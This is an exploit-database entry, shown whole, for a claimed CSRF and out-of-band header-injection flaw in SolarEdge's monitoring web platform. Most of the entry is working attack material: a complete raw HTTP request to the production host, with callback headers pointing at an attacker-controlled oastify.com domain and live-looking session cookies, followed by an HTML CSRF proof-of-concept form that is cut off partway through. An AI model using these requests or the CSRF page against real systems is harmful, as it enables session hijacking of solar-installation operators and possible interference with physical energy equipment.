---
title: solaredge-CSRF-OOB-Injection
url: https://cxsecurity.com/issue/WLB-2026040017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-26
fetch_date: 2026-04-27T05:06:50.541688
---

# solaredge-CSRF-OOB-Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **solaredge-CSRF-OOB-Injection** **2026.04.26**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: solaredge-CSRF-OOB-Injection
# Author: nu11secur1tyAI
# Date: 2026-04-26
# Vendor: SolarEdge Technologies Ltd.
# Software: SolarEdge Monitoring Platform - Framework /solaredge-web/
# Reference: https://monitoring.solaredge.com/
## Description:
The solaredge-CSRF-Hijack vulnerability arises due to a critical business logic flaw in the `/solaredge-web/p/initClient` endpoint. The system allows the generation and overwriting of session parameters (`createCookie`) via POST requests that are not properly validated against their origin.
An attacker can exploit this flaw to force a legitimate operator's browser to execute unauthorized commands without their knowledge. Additionally, an Out-of-Band (OOB) injection vulnerability was discovered via the `X-Forwarded-For` and `Referer` headers. By manipulating these headers, an attacker forces the SolarEdge internal infrastructure to initiate requests to external, attacker-controlled domains (e.g., oastify.com or a custom malicious site). This demonstrates a lack of framework-level filtration, leading to session compromise and potential unauthorized control over physical photovoltaic systems.
STATUS: MEDIUM - HIGH/ Vulnerability
[+]Payload:
``` POST
POST /solaredge-web/p/initClient?cmd=createCookie&target=login&client=touch%3Afalse%7Ccsstransforms3d%3Atrue%7Cgeneratedcontent%3Atrue%7Cfontface%3Atrue%7Cflexbox%3Atrue%7Ccanvas%3Atrue%7Ccanvastext%3Atrue%7Cwebgl%3Atrue%7Cgeolocation%3Atrue%7Cpostmessage%3Atrue%7Cwebsqldatabase%3Afalse%7Cindexeddb%3Atrue%7Chashchange%3Atrue%7Chistory%3Atrue%7Cdraganddrop%3Atrue%7Cwebsockets%3Atrue%7Crgba%3Atrue%7Chsla%3Atrue%7Cmultiplebgs%3Atrue%7Cbackgroundsize%3Atrue%7Cborderimage%3Atrue%7Cborderradius%3Atrue%7Cboxshadow%3Atrue%7Ctextshadow%3Atrue%7Copacity%3Atrue%7Ccssanimations%3Atrue%7Ccsscolumns%3Atrue%7Ccssgradients%3Atrue%7Ccssreflections%3Atrue%7Ccsstransforms%3Atrue%7Ccsstransitions%3Atrue%7Cvideo%3A%7Cogg%3Afalse%7Ch264%3Afalse%7Cwebm%3Atrue%7Caudio%3A%7Cogg%3Atrue%7Cmp3%3Atrue%7Cwav%3Atrue%7Cm4a%3Afalse%7Clocalstorage%3Atrue%7Csessionstorage%3Atrue%7Cwebworkers%3Atrue%7Capplicationcache%3Afalse%7Csvg%3Atrue%7Cinlinesvg%3Atrue%7Csmil%3Atrue%7Csvgclippaths%3Atrue%7Cinput%3A%7Cautocomplete%3Atrue%7Cautofocus%3Atrue%7Clist%3Atrue%7Cplaceholder%3Atrue%7Cmax%3Atrue%7Cmin%3Atrue%7Cmultiple%3Atrue%7Cpattern%3Atrue%7Crequired%3Atrue%7Cstep%3Atrue%7Cinputtypes%3A%7Csearch%3Atrue%7Ctel%3Atrue%7Curl%3Atrue%7Cemail%3Atrue%7Cdatetime%3Afalse%7Cdate%3Atrue%7Cmonth%3Atrue%7Cweek%3Atrue%7Ctime%3Atrue%7Cdatetime-local%3Atrue%7Cnumber%3Atrue%7Crange%3Atrue%7Ccolor%3Atrue%7Cfileapi%3Atrue%7Cfullscreen%3Atrue%7CclientWidth%3A800%7CclientHeight%3A600%7CwindowInnerWidth%3A1920%7CwindowInnerHeight%3A1080%7CwindowMaxWidth%3A800%7CwindowMaxHeight%3A600%7Cflash%3Atrue%7Cmobile%3Afalse%7Cphone%3Afalse%7Ctablet%3Afalse%7Cie11%3Afalse%7Ces6%3Atrue HTTP/2
Host: monitoring.solaredge.com
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="146", "Not;A=Brand";v="24", "Google Chrome";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
X-Forwarded-For: cn3iam50ywo00n2a5vvi3o59r0xrln9c.oastify.com
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: \*/\*
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=6F1B6162792D05EFCE515BF203A1921E9D85FA41057990C6C526B90DAEB5D65BFE52B0034F4F2D5B10424FFE2CBA711A654936F114998927041CA486611931EE3C0F205C04CA429EC894DF7A64DE9DB5108F3140B957001C751D7A57EF756DDD7971301F05C962751C9CA2F4D39478356BDF1D2ABEF343E3B0C8D5D9FF19A8F2; cf\_clearance=DtyVi9hHPwvwTxW7i3XtdkHyMQmr.8bxpKOx7YOux2k-1777189382-1.2.1.1-Oe0DEHsLmJqAbUfnWsvheB8svxkc8b6u25VOWn6Q5.47kl..hy7lFUAWAFjjxFt3iVZDZvc.3dByQVMD7OKuyNedVj14sw4mf3ixhjjUzo.u8AbMMvMzr3dTFA.4ZMxREUB6w\_km08hdN2Q9dqPdyl6a3Yo2ClDEosIsGuHs5gZkTMybd50CzjFB8UhCMfJDkUND4ZgT7yhn9nuwGnRpOdiW9xeQyMCzd52WXjDuGnrAADkNCbkOM.6VcWypMaA.f2gz2TVRI9gXPqpGBlnxTiwQB25NHZe\_oxGVldzLBNdG0M42RlULw5G7DAcF\_r1wh.UGpZYS8D4007p9.A\_OAQ; \_\_cf\_bm=PxF5ZT6Bu4Jvd86dcTD\_ayOFIDAo62QeOUj7C0QEn\_s-1777189382.1867328-1.0.1.1-8S0957YKxPKpytYZZF4ullyTfKTwS8YpjtVRZlwNMROgEmHBO4fsAHVXdp6MPfQTg3igFXX.Ec4FXoaC5N3gaRAqF8uuepOG1x26\_eex8fjMXRd9Mldj1PH43.f.p2Yb; CSRF-TOKEN=38962BC08EC10395F7DE6C11BC3794A98C5AF2B9B56066AC1830F7780E4C8394BA3D0CA2E2D5148E0BB52B778A7C8A11FD90
Origin: https://monitoring.solaredge.com
Referer: http://cn3iam50ywo00n2a5vvi3o59r0xrln9c.oastify.com/vulnerabilities/
Content-Length: 0
```
[+]Exploit:
```html
<html>
<!-- CSRF PoC -->
<body>
<form action="https://monitoring.solaredge.com/solaredge-web/p/initClient?cmd=createCookie&target=login&client=touch%3Afalse%7Ccsstransforms3d%3Atrue%7Cgeneratedcontent%3Atrue%7Cfontface%3Atrue%7Cflexbox%3Atrue%7Ccanvas%3Atrue%7Ccanvastext%3Atrue%7Cwebgl%3Atrue%7Cgeolocation%3Atrue%7Cpostmessage%3Atrue%7Cwebsqldatabase%3Afalse%7Cindexeddb%3Atrue%7Chashchange%3Atrue%7Chistory%3Atrue%7Cdraganddrop%3Atrue%7Cwebsockets%3Atrue%7Crgba%3Atrue%7Chsla%3Atrue%7Cmultiplebgs%3Atrue%7Cbackgroundsize%3Atrue%7Cborderimage%3Atrue%7Cborderradius%3Atrue%7Cboxshadow%3Atrue%7Ctextshadow%3Atrue%7Copacity%3Atrue%7Ccssanimations%3Atrue%7Ccsscolumns%3Atrue%7Ccssgradients%3Atrue%7Ccssreflections%3Atrue%7Ccsstransforms%3Atrue%7Ccsstransitions%3Atrue%7Cvideo%3A%7Cogg%3Afalse%7Ch264%3Afalse%7Cwebm%3Atrue%7Caudio%3A%7Cogg%3Atrue%7Cmp3%3Atrue%7Cwav%3Atrue%7Cm4a%3Afalse%7Clocalstorage%3Atrue%7Csessionstorage%3Atrue%7Cwebworkers%3Atrue%7Capplicationcache%3Afalse%7Csvg%3Atrue%7Cinlinesvg%3Atrue%7Csmil%3Atrue%7Csvgclippaths%3Atrue%7Cinput%3A%7Cautocomplete%3Atrue%7Cautofocus%3Atrue%7Clist%3Atrue%7Cplaceholder%3Atrue%7Cmax%3Atrue%7Cmin%3Atrue%7Cmultiple%3Atrue%7Cpattern%3Atrue%7Crequired%3Atrue%7Cstep%3Atrue%7Cinputtypes%3A%7Csearch%3Atrue%7Ctel%3Atrue%7Curl%3Atrue%7C...